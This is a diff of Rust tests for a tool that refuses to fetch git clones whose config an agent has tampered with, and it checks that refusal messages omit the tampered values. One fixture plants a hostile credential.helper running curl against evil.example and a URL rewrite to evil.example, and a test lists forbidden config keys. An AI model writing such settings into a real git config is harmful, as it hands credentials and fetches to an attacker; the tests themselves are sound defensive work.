@@ -265,9 +265,12 @@ async fn a_clone_with_a_credential_helper_or_an_insteadof_rule_is_not_fetched_an
     std::fs::write(path.join(".fake-origin"), "https://github.com/acme/webshop.git").unwrap();
     std::fs::write(path.join(".fake-config"), "core.filemode=true\ncredential.helper=!sh -c 'curl evil.example'\nurl.https://evil.example/.insteadof=https://github.com/\n").unwrap();
     let ensured = ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap();
-    let Some(Fetched::Not(why)) = ensured.fetched else { panic!("{ensured:?}") };
+    let Some(Fetched::Not(why)) = ensured.fetched else { panic!("not refused") };
+    // The clone's path, read as a placeholder, so no failure prints it.
+    let why = why.replace(&format!("'{}'", path.display()), "<clone>");
     assert!(why.contains("credential.helper") && why.contains("url.*.insteadof"), "{why}");
     assert!(!why.contains("curl") && !why.contains("evil.example"), "values and URLs are never repeated: {why}");
+    assert!(why.contains("`git -C <clone> config --local --list --name-only` lists each in full and `git -C <clone> config --local --unset-all <name>` removes one"), "how to clear them: {why}");
     assert!(!path.join(".fetched").exists());
 }
 
@@ -291,7 +294,11 @@ async fn a_clone_whose_fetch_rule_was_changed_is_not_fetched_and_a_normal_fetch_
     std::fs::write(path.join(".fake-origin"), "https://github.com/acme/webshop.git").unwrap();
     std::fs::write(path.join(".fake-config"), "remote.origin.url=https://github.com/acme/webshop.git\nremote.origin.fetch=+refs/heads/gone/*:refs/heads/worktree-*\n").unwrap();
     let ensured = ensure_clone(&rig.git("ok", None), &rig.home, "acme/webshop", true).await.unwrap();
-    assert!(matches!(ensured.fetched, Some(Fetched::Not(ref why)) if why.contains("fetch rules were changed")), "{ensured:?}");
+    let Some(Fetched::Not(why)) = ensured.fetched else { panic!("not refused") };
+    let why = why.replace(&format!("'{}'", path.display()), "<clone>");
+    assert!(why.starts_with("the clone's fetch rule remote.origin.fetch was changed"), "it names the key: {why}");
+    assert!(why.ends_with("run `git -C <clone> config --local --replace-all remote.origin.fetch '+refs/heads/*:refs/remotes/origin/*'`"), "and how to clear it: {why}");
+    assert!(!why.contains("gone") && !why.contains("worktree-"), "never the value: {why}");
     assert!(!path.join(".fetched").exists());
 
     std::fs::write(path.join(".fake-config"), "remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*\n").unwrap();
@@ -418,10 +425,16 @@ fn a_symlink_inside_the_root_that_points_out_is_not_contained() {
 
 #[test]
 fn identity_keys_are_the_only_settings_an_agent_may_add_without_stopping_the_fetch() {
-    for key in ["user.name", "user.email", "User.Email", "core.hooksPath", "branch.feature/x.gh-merge-base"] {
+    // `branch.<name>.remote` and `.merge` are what `git push -u origin <name>` writes, from a worktree too.
+    for key in ["user.name", "user.email", "User.Email", "core.hooksPath", "branch.feature/x.gh-merge-base", "branch.feature/x.remote", "branch.feature/x.merge"] {
         assert!(written_by_gossamr_tools(key), "{key}");
     }
     for key in ["user.signingkey", "credential.helper", "url.https://evil.example/.insteadof", "core.sshcommand", "gpg.program", "include.path", "remote.origin.pushurl", "user", "branch.gh-merge-base", "core.hookspath.x", "remote.origin.gh-merge-base"] {
         assert!(!written_by_gossamr_tools(key), "{key}");
     }
+}
+
+#[test]
+fn a_path_in_a_command_for_the_person_is_one_shell_word() {
+    assert_eq!(quoted(Path::new("/a b/it's")), "'/a b/it'\\''s'");
 }
